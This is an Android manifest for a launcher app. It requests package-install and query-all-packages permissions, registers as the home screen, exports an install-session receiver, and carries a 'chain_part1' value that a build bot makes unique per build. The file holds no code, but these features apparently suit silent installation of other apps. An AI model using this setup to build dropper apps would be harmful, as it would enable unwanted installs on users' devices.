<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:installLocation="internalOnly">

    <uses-permission android:name="android.permission.INSTALL_PACKAGES"
        tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />

    <application
        android:name=".LauncherApplication"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:theme="@style/AppTheme"
        android:allowBackup="false"
        android:supportsRtl="true"
        android:hardwareAccelerated="true"
        android:usesCleartextTraffic="false"
        tools:remove="android:extractNativeLibs,android:appComponentFactory">

        <!-- Block AndroidX auto-injected entries -->
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:authorities="${applicationId}.androidx-startup"
            tools:node="remove" />

        <!-- CHAIN METADATA: Bot replaces PLACEHOLDER with unique value per build -->
        <meta-data
            android:name="chain_part1"
            android:value="PLACEHOLDER" />

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:screenOrientation="portrait"
            android:clearTaskOnLaunch="true"
            android:finishOnTaskLaunch="false">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.HOME" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name=".SecondActivity"
            android:exported="false"
            android:screenOrientation="portrait" />

        <activity
            android:name=".InstallActivity"
            android:exported="false"
            android:screenOrientation="portrait" />

        <receiver
            android:name=".InstallReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.content.pm.action.SESSION_COMMITMENT" />
                <!-- Uses applicationId — updates automatically per build -->
                <action android:name="${applicationId}.SESSION_ACTION" />
            </intent-filter>
        </receiver>

        <service
            android:name=".service.LauncherService"
            android:exported="false" />

    </application>
</manifest>
